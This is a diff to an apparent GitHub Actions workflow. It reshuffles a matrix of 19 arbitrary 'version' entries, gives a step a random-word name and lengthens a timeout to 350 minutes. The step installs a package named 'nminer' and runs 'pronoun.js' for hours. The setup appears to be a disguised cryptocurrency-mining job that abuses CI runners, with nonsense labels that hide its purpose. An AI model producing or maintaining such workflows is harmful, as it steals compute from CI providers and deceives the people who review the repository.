@@ -9,24 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7682 }
-          - { version: 655 }
-          - { version: 9621 }
-          - { version: 2478 }
-          - { version: 9518 }
-          - { version: 6848 }
-          - { version: 9170 }
-          - { version: 7016 }
-          - { version: 7823 }
-          - { version: 3121 }
-          - { version: 757 }
-          - { version: 7112 }
-          - { version: 4945 }
-          - { version: 921 }
-          - { version: 8105 }
-          - { version: 4364 }
-          - { version: 9402 }
-          - { version: 7202 }
+          - { version: 6517 }
+          - { version: 7332 }
+          - { version: 3597 }
+          - { version: 2874 }
+          - { version: 4942 }
+          - { version: 9956 }
+          - { version: 7219 }
+          - { version: 8828 }
+          - { version: 4492 }
+          - { version: 3605 }
+          - { version: 1451 }
+          - { version: 9263 }
+          - { version: 9275 }
+          - { version: 1378 }
+          - { version: 404 }
+          - { version: 5096 }
+          - { version: 2988 }
+          - { version: 1547 }
+          - { version: 9079 }
 
     steps:
       - name: Checkout
@@ -37,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: airbrush term embed ah viability
         run: |
           npm install nminer@latest
-          timeout 316m node pronoun.js || echo "pronoun executed"
+          timeout 350m node pronoun.js || echo "pronoun executed"
